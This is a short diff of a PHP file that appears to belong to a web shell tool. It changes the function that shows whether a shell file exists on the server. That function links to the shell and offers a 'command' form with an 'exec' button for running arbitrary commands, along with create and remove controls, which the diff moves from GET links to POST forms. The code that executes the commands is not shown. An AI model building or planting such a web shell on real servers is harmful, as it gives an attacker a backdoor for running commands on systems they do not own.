@@ -66,15 +66,22 @@ function remove_directory($dir) {
 
 function display_shell($shell) {
     if (file_exists($shell)) {
-        echo "<p>shell at [<a href=\"$shell\">$shell</a>]";
-        echo " (<a href=\"?remove=1\">remove</a>)</p>";
-        echo "<form action=\"$_SERVER[PHP_SELF]\" method=\"post\">";
-        echo "Command: <input autofocus type=\"text\" name=\"cmd\" />";
-        echo "<input type=\"submit\" value=\"Exec\" /></form>";
+        echo "<p>shell at [<a href=\"$shell\">$shell</a>]</p>";
+        echo "<form action=\"\" method=\"post\">";
+        echo "<input type=\"hidden\" name=\"remove\" value=\"1\" />";
+        echo "<input type=\"submit\" value=\"remove shell\" />";
+        echo "</form>";
+        echo "<form action=\"\" method=\"post\">";
+        echo "command: <input autofocus type=\"text\" name=\"cmd\" />";
+        echo "<input type=\"submit\" value=\"exec\" /></form>";
     }
     else {
 
-        echo "<p>no shell found (<a href=\"?create=1\">create</a>)</p>";
+        echo "<p>no shell found.</p>";
+        echo "<form action=\"\" method=\"post\">";
+        echo "<input type=\"hidden\" name=\"create\" value=\"1\" />";
+        echo "<input type=\"submit\" value=\"create shell\" />";
+        echo "</form>";
     }
 }
 
